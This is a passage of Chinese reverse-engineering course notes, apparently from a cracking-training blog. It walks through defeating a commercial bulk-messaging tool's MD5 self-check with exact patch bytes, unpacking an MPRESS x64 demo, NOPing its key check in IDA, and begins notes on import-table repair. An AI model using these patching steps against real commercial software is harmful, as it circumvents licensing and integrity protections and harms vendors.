class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">00567ED8  /.  55            push ebp</span><br><span class="line">00567ED9  |.  8BEC          mov ebp,esp</span><br><span class="line">00567EDB  |.  6A 00         push 0x0</span><br><span class="line">00567EDD  |.  6A 00         push 0x0</span><br><span class="line">00567EDF  |.  33C0          xor eax,eax</span><br><span class="line">00567EE1  |.  55            push ebp</span><br><span class="line">00567EE2  |.  68 347F5600   push qqqf3_1.00567F34</span><br><span class="line">00567EE7  |.  64:FF30       push dword ptr fs:[eax]</span><br><span class="line">00567EEA  |.  64:8920       mov dword ptr fs:[eax],esp</span><br><span class="line">00567EED  |.  8D4D F8       lea ecx,[local.2]</span><br><span class="line">00567EF0  |.  33D2          xor edx,edx</span><br><span class="line">00567EF2  |.  B8 1E000000   mov eax,0x1E</span><br><span class="line">00567EF7  |.  E8 C4AEF4FF   call qqqf3_1.004B2DC0</span><br><span class="line">00567EFC  |.  8B55 F8       mov edx,[local.2]</span><br><span class="line">00567EFF  |.  8D45 FC       lea eax,[local.1]</span><br><span class="line">00567F02  |.  E8 D1CCE9FF   call qqqf3_1.00404BD8</span><br><span class="line">00567F07  |.  8B45 FC       mov eax,[local.1]</span><br><span class="line">00567F0A  |.  50            push eax</span><br><span class="line">00567F0B  |.  E8 5049FFFF   call qqqf3_1.0055C860</span><br><span class="line">00567F10  |.  5A            pop edx                                  ;  qqqf3_1.0048B2DC</span><br><span class="line">00567F11  |.  E8 9AF9F8FF   call qqqf3_1.004F78B0</span><br><span class="line">00567F16  |.  33C0          xor eax,eax</span><br><span class="line">00567F18  |.  5A            pop edx                                  ;  qqqf3_1.0048B2DC</span><br><span class="line">00567F19  |.  59            pop ecx                                  ;  qqqf3_1.0048B2DC</span><br><span class="line">00567F1A  |.  59            pop ecx                                  ;  qqqf3_1.0048B2DC</span><br><span class="line">00567F1B  |.  64:8910       mov dword ptr fs:[eax],edx</span><br><span class="line">00567F1E  |.  68 3B7F5600   push qqqf3_1.00567F3B</span><br><span class="line">00567F23  |&gt;  8D45 F8       lea eax,[local.2]</span><br><span class="line">00567F26  |.  E8 ADC3E9FF   call qqqf3_1.004042D8</span><br><span class="line">00567F2B  |.  8D45 FC       lea eax,[local.1]</span><br><span class="line">00567F2E  |.  E8 DDCAE9FF   call qqqf3_1.00404A10</span><br><span class="line">00567F33  \.  C3            retn</span><br></pre></td></tr></table></figure><p>一个一个点击回车跟随call指令进去看看，后面的那几个call要不就是没有call指令要不就是无关文件的API函数，都可以不管。<code>00567EF7</code>地址的call指令，进去的第二个call的第一个call，看到<code>GetModuleFileNameA</code>函数，所以<code>00567EF7</code>的函数调用是自校验的关键函数。在<code>GetModuleFileNameA</code>函数下断运行。<code>GetModuleFileNameA</code>函数的意思是获取当前进程已加载模块的完整路径，该模块必须由当前进程加载。</p><p>继续F8单步，运行到此处时，可以看到eax显示<code>C:\Program Files\QQSendFriend\Desklog.dll</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004B2E1A  |.  E8 856FF5FF   call qqqf3_1.00409DA4</span><br></pre></td></tr></table></figure><p>F7跟进去，发现这个函数是用来创建<code>Desklog.dll</code>文件的。再看下个函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004B2E27  |.  E8 14E2FFFF   call qqqf3_1.004B1040</span><br></pre></td></tr></table></figure><p>跟进去，第一个call指令里有个<code>SetFilePointer</code>函数，在一个文件中设置新的读取位置。第二个call指令里有个<code>ReadFile</code>函数。第三个又是<code>SetFilePointer</code>函数，跳出循环，第四个又是<code>ReadFile</code>函数等等。但运行完整个<code>4B1040</code>函数程序都没有返回火星文。那继续往下看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">004B2E27  |.  E8 14E2FFFF   call qqqf3_1.004B1040</span><br><span class="line">004B2E2C  |.  8BC7          mov eax,edi</span><br><span class="line">004B2E2E  |.  E8 9170F5FF   call qqqf3_1.00409EC4;关闭句柄</span><br><span class="line">004B2E33  |.  8D55 F0       lea edx,[local.4]</span><br><span class="line">004B2E36  |.  33C0          xor eax,eax</span><br><span class="line">004B2E38  |.  E8 2FFCF4FF   call qqqf3_1.00402A6C;又是GetMouduleFileNameA</span><br><span class="line">004B2E3D  |.  8B45 F0       mov eax,[local.4]</span><br><span class="line">004B2E40  |.  8D55 F8       lea edx,[local.2]</span><br><span class="line">004B2E43  |.  E8 ECF0FFFF   call qqqf3_1.004B1F34;跟进去</span><br></pre></td></tr></table></figure><p>在<code>004B1F34</code>这个函数的第三个call语句<code>4B1DD8</code>函数发现<code>CreateFile</code>函数，是一个多功能的函数，可打开或创建文件或者I/O设备。继续F8，还看到了一个<code>GetFileSize</code>函数用来获取文件大小。获取文件大小后的那个函数就是MD5校验算法，我们暂时没那个能力对算法进行跟踪，所以先暂时互相放过彼此。</p><p>继续F8返回到<code>4B1DD8</code>处，F8去到<code>4B1F74</code>处，信息窗口显示堆栈地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">004B1F6A  |.  E8 69FEFFFF   call qqqf3_1.004B1DD8</span><br><span class="line">004B1F6F  |.  BE 10000000   mov esi,0x10</span><br><span class="line">004B1F74  |.  8D5D EC       lea ebx,[local.5]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">堆栈地址=0012FCD8</span><br><span class="line">ebx=0012FD54</span><br></pre></td></tr></table></figure><p>数据窗口跟随，<code>0012FCD8</code>一行显示的就是当前程序的MD5值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0012FCD8  52 8C 2A 4F CB 43 39 6F 2D 6F 7A 91 FE C0 CF DC  R?O薈9o-oz扊老</span><br></pre></td></tr></table></figure><p>而原程序的MD5值为11ea70a3c3735c29b48552776756406a。可以把当前程序拖去WinMD5检验是否为上面的MD5值528C2A4FCB43396F2D6F7A91FEC0CFDC。</p><p>选中<code>lea ebx,[local.5]</code>右键 -&gt; 分析 -&gt; 从模块中删除分析。将下面代码复制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">004B1F74    8D5D EC         lea ebx,dword ptr ss:[ebp-0x14]</span><br><span class="line">004B1F77    8D55 E8         lea edx,dword ptr ss:[ebp-0x18]</span><br><span class="line">004B1F7A    33C0            xor eax,eax</span><br><span class="line">004B1F7C    8A03            mov al,byte ptr ds:[ebx]</span><br><span class="line">004B1F7E    E8 35F1FFFF     call qqqf3_1.004B10B8</span><br><span class="line">004B1F83    8B55 E8         mov edx,dword ptr ss:[ebp-0x18]</span><br><span class="line">004B1F86    8BC7            mov eax,edi</span><br><span class="line">004B1F88    E8 3F26F5FF     call qqqf3_1.004045CC</span><br><span class="line">004B1F8D    43              inc ebx</span><br><span class="line">004B1F8E    4E              dec esi</span><br><span class="line">004B1F8F  ^ 75 E6           jnz short qqqf3_1.004B1F77</span><br></pre></td></tr></table></figure><p>在程序中找一段空代码，比如从<code>0056B0A0</code>开始。在<code>4B1F74</code>修改代码<code>jmp 0056B0A0</code>，将已经复制的代码都NOP掉。F8跳下去，将上面的第1行代码修改成<code>mov dword ptr ss:[ebp-0x14],1</code>放到<code>0056B0A0</code>。将原程序的MD5值二进制粘贴到数据窗口覆盖当前程序的MD5。</p><p>修改第1行代码为<code>mov dword ptr ss:[ebp-0x14],0xA370EA11</code>。继续编写第2到4行代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov dword ptr ss:[ebp-0x10],0x295c73c3</span><br><span class="line">mov dword ptr ss:[ebp-0xC],0x775285b4</span><br><span class="line">mov dword ptr ss:[ebp-0x8],0x6a405667</span><br></pre></td></tr></table></figure><p>再将上面的二进制代码复制下来，确保一一对应，成品如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0056B0A0    C745 EC 11EA70A3        mov dword ptr ss:[ebp-0x14],0xA370EA11</span><br><span class="line">0056B0A7    C745 F0 C3735C29        mov dword ptr ss:[ebp-0x10],0x295C73C3</span><br><span class="line">0056B0AE    C745 F4 B4855277        mov dword ptr ss:[ebp-0xC],0x775285B4</span><br><span class="line">0056B0B5    C745 F8 6756406A        mov dword ptr ss:[ebp-0x8],0x6A405667</span><br><span class="line">0056B0BC    8D5D EC                 lea ebx,dword ptr ss:[ebp-0x14]</span><br><span class="line">0056B0BF    8D55 E8                 lea edx,dword ptr ss:[ebp-0x18]</span><br><span class="line">0056B0C2    33C0                    xor eax,eax</span><br><span class="line">0056B0C4    8A03                    mov al,byte ptr ds:[ebx]</span><br><span class="line">0056B0C6    E8 ED5FF4FF             call qqqf3_1.004B10B8</span><br><span class="line">0056B0CB    8B55 E8                 mov edx,dword ptr ss:[ebp-0x18]</span><br><span class="line">0056B0CE    8BC7                    mov eax,edi</span><br><span class="line">0056B0D0    E8 F794E9FF             call qqqf3_1.004045CC</span><br><span class="line">0056B0D5    43                      inc ebx</span><br><span class="line">0056B0D6    4E                      dec esi</span><br><span class="line">0056B0D7  ^ 75 E6                   jnz short qqqf3_1.0056B0BF</span><br><span class="line">0056B0D9  ^ E9 B36EF4FF             jmp qqqf3_1.004B1F91</span><br></pre></td></tr></table></figure><p>F9运行，程序成功看到不是显示火星文，说明破解自校验成功。</p><p>右键 -&gt; 复制到可执行文件 -&gt; 所有修改 -&gt; 复制，保存文件。注意，有时候会出现“无法定位数据”的情况，这时就要改变空代码的位置。最好不要选程序最底端那段代码，经常不行…靠近汇编代码结束处距离5行左右最佳。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;破解豪迪群发器。&lt;/p&gt;
&lt;p&gt;打开注册页面，随便输入注册码，会出现以下：&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="OllyDbg" scheme="http://example.com/tags/OllyDbg/"/>
    
    <category term="吾爱破解培训" scheme="http://example.com/tags/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD/"/>
    
  </entry>
  
  <entry>
    <title>第十课——x64平台脱壳与破解实战</title>
    <link href="http://example.com/posts/efe98763.html"/>
    <id>http://example.com/posts/efe98763.html</id>
    <published>2022-04-05T01:29:28.152Z</published>
    <updated>2022-04-11T05:26:01.291Z</updated>
    
    <content type="html"><![CDATA[<p>由于吾爱虚拟机是32位的，运行不了64位程序，所以这节课用物理机来操作。</p><h1 id="1-课程例子"><a href="#1-课程例子" class="headerlink" title="1. 课程例子"></a>1. 课程例子</h1><p>拿到程序，先运行一下熟悉流程，再查壳，发现有MPRESS壳(压缩壳)。压缩壳在壳段开始的时候做的第一件事往往是<code>pushad</code>(保存寄存器)，在壳段结束的时候做的最后一件事是<code>popad</code>(还原寄存器)，所以我们可以用ESP定律脱压缩壳。但在64位的程序下，一般不会这么做。</p><span id="more"></span><img src="/posts/efe98763/%E6%9F%A5%E5%A3%B3.png" class="" title="查壳"><p>将程序载入x64dbg，F9运行，去到标准的MPRESS的入口地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">000000014001B0C0 | 57                       | push rdi                                |</span><br><span class="line">000000014001B0C1 | 56                       | push rsi                                |</span><br><span class="line">000000014001B0C2 | 53                       | push rbx                                |</span><br><span class="line">000000014001B0C3 | 51                       | push rcx                                |</span><br><span class="line">000000014001B0C4 | 52                       | push rdx                                | rdx:EntryPoint</span><br><span class="line">000000014001B0C5 | 41:50                    | push r8                                |</span><br></pre></td></tr></table></figure><p>既然有push，那肯定也有pop，找到下面这几句指令，也就找到出口了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pop r8</span><br><span class="line">pop rdx</span><br><span class="line">pop rcx</span><br><span class="line">pop rbx</span><br><span class="line">pop rsi</span><br><span class="line">pop rdi</span><br></pre></td></tr></table></figure><p>但现在找不到，因为MPRESS把壳段跳到OEP的那部分代码给压缩了，要等它解压到那部分代码才能找到。</p><p>暂时先不管，单步跟踪试一下，到达一个跨区段的跳转<code>14001BBA7</code>。下面是空代码，上面有pop指令(但不是pop上面那几句)，很像UPX。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">000000014001BB9A | 41:5F                    | pop r15                                 |</span><br><span class="line">000000014001BB9C | 41:5E                    | pop r14                                 |</span><br><span class="line">000000014001BB9E | 41:5D                    | pop r13                                 |</span><br><span class="line">000000014001BBA0 | 41:5C                    | pop r12                                 |</span><br><span class="line">000000014001BBA2 | 5F                       | pop rdi                                 |</span><br><span class="line">000000014001BBA3 | 5E                       | pop rsi                                 |</span><br><span class="line">000000014001BBA4 | 5D                       | pop rbp                                 |</span><br><span class="line">000000014001BBA5 | 5B                       | pop rbx                                 |</span><br><span class="line">000000014001BBA6 | C3                       | ret                                     |</span><br><span class="line">000000014001BBA7 | E9 1F00FFFF              | jmp demo.14000BBCB                      |</span><br><span class="line">000000014001BBAC | 54                       | push rsp                                |</span><br><span class="line">000000014001BBAD | 54                       | push rsp                                |</span><br><span class="line">000000014001BBAE | FE                       | ???                                     |</span><br><span class="line">000000014001BBAF | FF                       | ???                                     |</span><br><span class="line">000000014001BBB0 | FF                       | ???                                     |</span><br><span class="line">000000014001BBB1 | FF                       | ???                                     |</span><br><span class="line">000000014001BBB2 | FF                       | ???                                     |</span><br><span class="line">000000014001BBB3 | FF00                     | inc dword ptr ds:[rax]                  |</span><br><span class="line">000000014001BBB5 | 0000                     | add byte ptr ds:[rax],al                |</span><br><span class="line">000000014001BBB7 | 004D 73                  | add byte ptr ss:[rbp+73],cl             |</span><br><span class="line">000000014001BBBA | 0000                     | add byte ptr ds:[rax],al                |</span><br><span class="line">000000014001BBBC | 0000                     | add byte ptr ds:[rax],al                |</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">41 5F 41 5E 41 5D 41 5C 5F 5E 5D 5B C3</span><br></pre></td></tr></table></figure><p>执行完<code>jmp</code>后，MPRESS完成了第一次解压。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">000000014000BBCB | 48:83EC 28               | sub rsp,28                              |</span><br><span class="line">000000014000BBCF | 48:0300                  | add rax,qword ptr ds:[rax]              |</span><br><span class="line">000000014000BBD2 | 0AC0                     | or al,al                                |</span><br><span class="line">000000014000BBD4 | 0F85 85000000            | jne demo.14000BC5F                      |</span><br><span class="line">000000014000BBDA | 48:2D 00100000           | sub rax,1000                            |</span><br></pre></td></tr></table></figure><p>继续单步，到下面这一步跑飞，重载，再次运行到这里时F7进去这个call指令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">000000014000BBFB | E8 09000000              | call demo.14000BC09                     |;进去</span><br></pre></td></tr></table></figure><p>再次跑飞，再进去单步</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">000000014000BC14 | E8 0F000000              | call demo.14000BC28                     |;进去</span><br></pre></td></tr></table></figure><p>运行到此处，这几条pop与开头几条push对应，并且<code>jmp</code>是个大跳转。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">000000014000BCD5 | 41:58                    | pop r8                                  |</span><br><span class="line">000000014000BCD7 | 5A                       | pop rdx                                 |</span><br><span class="line">000000014000BCD8 | 59                       | pop rcx                                 |</span><br><span class="line">000000014000BCD9 | 5B                       | pop rbx                                 |</span><br><span class="line">000000014000BCDA | 5E                       | pop rsi                                 |</span><br><span class="line">000000014000BCDB | 5F                       | pop rdi                                 |</span><br><span class="line">000000014000BCDC | E9 4F54FFFF              | jmp demo.140001130                      |</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">41 58 5A 59 5B 5E 5F</span><br></pre></td></tr></table></figure><p>执行这个跳转，这里就是64位的VS2013编译出来的OEP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0000000140001130 | 48:83EC 28               | sub rsp,28                              | OEP</span><br><span class="line">0000000140001134 | E8 7B180000              | call demo.1400029B4                     |</span><br><span class="line">0000000140001139 | 48:83C4 28               | add rsp,28                              |</span><br><span class="line">000000014000113D | E9 02000000              | jmp demo.140001144                      |</span><br><span class="line">0000000140001142 | CC                       | int3                                    |</span><br><span class="line">0000000140001143 | CC                       | int3                                    |</span><br></pre></td></tr></table></figure><p>用Scylla将程序dump再fix dump，完成脱壳。</p><p>用脚本找OEP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">erun</span><br><span class="line">find rip,&quot;415F415E415D415C5F5E5D5BC3&quot;//搜索二进制</span><br><span class="line">mov first_jmp,$result//first_jmp=41(first_jmp指向pop r15那一行)</span><br><span class="line">add first_jmp,D//first_jmp=first_jmp+D=E9(加上0xD个偏移到达jmp)</span><br><span class="line">bp first_jmp//在jmp下断</span><br><span class="line">erun//运行</span><br><span class="line">bc//取消断点</span><br><span class="line">sti//F8</span><br><span class="line">find rip,&quot;41585A595B5E5F&quot;</span><br><span class="line">mov second_jmp,$result</span><br><span class="line">add second_jmp,7</span><br><span class="line">bp second_jmp</span><br><span class="line">erun</span><br><span class="line">bc</span><br><span class="line">sti//OEP</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>在脚本窗口中，右键-&gt;载入脚本，按空格直接运行脚本。</p><p>很简单的一个破解，搜索字符串改个跳转即可，右键-&gt;补丁-&gt;修补文件，后缀名自己加上。</p><p>如果是追码也很简单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">000000014000104C | FF15 CEB10000            | call qword ptr ds:[&lt;&amp;GetDlgItemTextA&gt;]  |</span><br><span class="line">0000000140001052 | 48:8D15 C7470100         | lea rdx,qword ptr ds:[140015820]        |</span><br><span class="line">0000000140001059 | 48:8D0D 88020100         | lea rcx,qword ptr ds:[1400112E8]        | 00000001400112E8:&quot;Fuck L4Nce&quot;</span><br><span class="line">0000000140001060 | E8 9B040000              | call demo_dump_scy.140001500            |</span><br><span class="line">0000000140001065 | 48:8BCB                  | mov rcx,rbx                             |</span><br><span class="line">0000000140001068 | 85C0                     | test eax,eax                            |</span><br><span class="line">000000014000106A | 75 13                    | jne demo_dump_scy.14000107F             |</span><br><span class="line">000000014000106C | 45:33C9                  | xor r9d,r9d                             |</span><br><span class="line">000000014000106F | 4C:8D05 7E020100         | lea r8,qword ptr ds:[1400112F4]         | r8:&amp;&quot;吚x\n€|$@&quot;, 00000001400112F4:&quot;Boom!&quot;</span><br><span class="line">0000000140001076 | 48:8D15 83020100         | lea rdx,qword ptr ds:[140011300]        | 0000000140011300:&quot;Congratulations! You have successfully fucked L4Nce&quot;</span><br><span class="line">000000014000107D | EB 14                    | jmp demo_dump_scy.140001093             |</span><br><span class="line">000000014000107F | 41:B9 10000000           | mov r9d,10                              |</span><br><span class="line">0000000140001085 | 4C:8D05 AC020100         | lea r8,qword ptr ds:[140011338]         | r8:&amp;&quot;吚x\n€|$@&quot;, 0000000140011338:&quot;Boomshakalaka&quot;</span><br><span class="line">000000014000108C | 48:8D15 B5020100         | lea rdx,qword ptr ds:[140011348]        | 0000000140011348:&quot;You Failed!&quot;</span><br></pre></td></tr></table></figure><p>在<code>GetDlgItemTextA</code>函数下断，这个是获取我们输入的字符串。两次F9运行至主程序，输入假码提交，停在断点处。接下来单步</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">000000014000104C | FF15 CEB10000            | call qword ptr ds:[&lt;&amp;GetDlgItemTextA&gt;]  |</span><br><span class="line">0000000140001052 | 48:8D15 C7470100         | lea rdx,qword ptr ds:[140015820]        | rdx:&quot;hhhhhhh&quot;, 0000000140015820:&quot;hhhhhhh&quot;</span><br><span class="line">0000000140001059 | 48:8D0D 88020100         | lea rcx,qword ptr ds:[1400112E8]        | rcx:&quot;Fuck L4Nce&quot;, 00000001400112E8:&quot;Fuck L4Nce&quot;</span><br><span class="line">0000000140001060 | E8 9B040000              | call demo_dump_scy.140001500            |</span><br><span class="line">0000000140001065 | 48:8BCB                  | mov rcx,rbx                             | rcx:&quot;Fuck L4Nce&quot;</span><br><span class="line">0000000140001068 | 85C0                     | test eax,eax                            |</span><br><span class="line">000000014000106A | 75 13                    | jne demo_dump_scy.14000107F             |</span><br><span class="line">000000014000106C | 45:33C9                  | xor r9d,r9d                             |</span><br><span class="line">000000014000106F | 4C:8D05 7E020100         | lea r8,qword ptr ds:[1400112F4]         | 00000001400112F4:&quot;Boom!&quot;</span><br><span class="line">0000000140001076 | 48:8D15 83020100         | lea rdx,qword ptr ds:[140011300]        | rdx:&quot;hhhhhhh&quot;, 0000000140011300:&quot;Congratulations! You have successfully fucked L4Nce&quot;</span><br></pre></td></tr></table></figure><p>很明显就是我们输入的字符串与<code>Fuck L4Nce</code>比较。</p><p>如果想在64位下做补丁工具，推荐用IDA。将脱完壳的程序载入IDA，在Options-&gt;General勾选地址前缀和填上要显示的字节个数。</p><img src="/posts/efe98763/%E5%9C%B0%E5%9D%80.png" class="" title="地址和字节"><p>在汇编窗口找到成功与失败的分岔路。</p><img src="/posts/efe98763/jnz.png" class="" title="分岔路"><p>选中<code>jnz</code>指令，在界面上Edit-&gt;Patch program-&gt;Assemble，将jnz改为nop，由于jnz有两个字节，所以要连续修改两个nop。或者Edit-&gt;Patch program-&gt;Change word，写入0x9090。</p><img src="/posts/efe98763/nop.png" class="" title="nop掉"><p>现在可以看到，上面那块与左边那块合并了，而右边那块被独立出来，没有箭头指向右边那块了。</p><p>然后Edit-&gt;Patch program-&gt;Apply patches to input file，输出窗口提示应用成功。</p><img src="/posts/efe98763/%E8%BE%93%E5%87%BA%E7%AA%97%E5%8F%A3.png" class="" title="输出窗口"><p>课后作业几乎与课程例子一模一样，所以不记笔记了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;由于吾爱虚拟机是32位的，运行不了64位程序，所以这节课用物理机来操作。&lt;/p&gt;
&lt;h1 id=&quot;1-课程例子&quot;&gt;&lt;a href=&quot;#1-课程例子&quot; class=&quot;headerlink&quot; title=&quot;1. 课程例子&quot;&gt;&lt;/a&gt;1. 课程例子&lt;/h1&gt;&lt;p&gt;拿到程序，先运行一下熟悉流程，再查壳，发现有MPRESS壳(压缩壳)。压缩壳在壳段开始的时候做的第一件事往往是&lt;code&gt;pushad&lt;/code&gt;(保存寄存器)，在壳段结束的时候做的最后一件事是&lt;code&gt;popad&lt;/code&gt;(还原寄存器)，所以我们可以用ESP定律脱压缩壳。但在64位的程序下，一般不会这么做。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="x64dbg" scheme="http://example.com/tags/x64dbg/"/>
    
    <category term="IDA" scheme="http://example.com/tags/IDA/"/>
    
    <category term="吾爱破解培训" scheme="http://example.com/tags/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD/"/>
    
  </entry>
  
  <entry>
    <title>第八九课——深入浅出探讨脱壳细节</title>
    <link href="http://example.com/posts/4b9d65e0.html"/>
    <id>http://example.com/posts/4b9d65e0.html</id>
    <published>2022-04-05T01:29:28.142Z</published>
    <updated>2022-04-11T05:25:50.176Z</updated>
    
    <content type="html"><![CDATA[<p>在做第五六课的打补丁作业时，遇到了在不脱壳的情况下修改程序。在复制到可执行文件时提示“无法定位数据”。这是因为程序加壳后，代码段显示全是空代码，我们修改代码时，系统执行将某代码1修改为某代码2，但系统在代码段找不到某代码1，所以提示“无法定位数据”。</p><p>但如果我们将程序脱壳了，就可在程序上随意修改，所以脱壳的重要性就体现出来了。脱壳毁一生，破解穷三代(bushi)。</p><span id="more"></span><p><strong>脱壳细节</strong></p><ol><li>找OEP(只是万里长征的第一步)</li><li>dump</li></ol><ul><li>无法读取进程内存:换工具(Scylla不错)</li></ul><ol><li>修复IAT</li></ol><ul><li>在此OEP入口没有找到任何有用信息:在你使用的工具选项中取消勾选使用来自磁盘的PE文件,还是不行换工具(Scylla)</li><li>无效函数<ul><li>剪切指针</li><li>跟踪级别1</li><li>跟踪级别3</li><li>插件跟踪</li><li>手动查找输入表(在OD中找)</li><li>OD脚本</li></ul></li></ul><p>程序的加载过程：程序被加载进内存里-&gt;系统根据程序的导入表，填充程序所需的API函数到程序的内存里(IAT：导入地址表)。</p><p>壳：程序的导入表是静态可见的，包含了导入的DLL名称和其导入函数(用exeinfo可看)，有些壳会在加壳的时候把导入表结构取出，然后自行加密，或改变结构。这时系统找不到导入表，也就无法给程序填充所需的API函数地址。加过壳的程序一定是可以运行的，所以很明显这个填充过程被取代了，这个过程会在壳段完成。如果脱壳时直接dump，程序的导入表也就不在了，IAT所填充的函数地址是当前系统的地址，所以这个程序可能只能在脱壳的机器上运行。为了解决这个问题，import REC导入IAT地址值生成一份导入表，然后让程序使用新的导入表，程序可跨系统，在各个机器上与运行。但有些加密壳会使import REC失效，导致导入表无法修复。</p><p>如何使import REC失效：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">本来的函数调用</span><br><span class="line">call addr_api</span><br><span class="line"></span><br><span class="line">某些壳会修改代码</span><br><span class="line">call packspace(packspace:junkcode/无效操作/vm)</span><br><span class="line">jmp addr_api</span><br></pre></td></tr></table></figure><p>也就是间接调用API函数，使工具无法修复导入表。</p><p>如何使import REC失效变为有效，将间接调用修改为直接调用，API有很多，所以不可能人工一个个API函数修改，而是用OD脚本。</p><h1 id="1-熟悉OD脚本工具的使用"><a href="#1-熟悉OD脚本工具的使用" class="headerlink" title="1. 熟悉OD脚本工具的使用"></a>1. 熟悉OD脚本工具的使用</h1><p>在反汇编窗口右键-&gt;Script 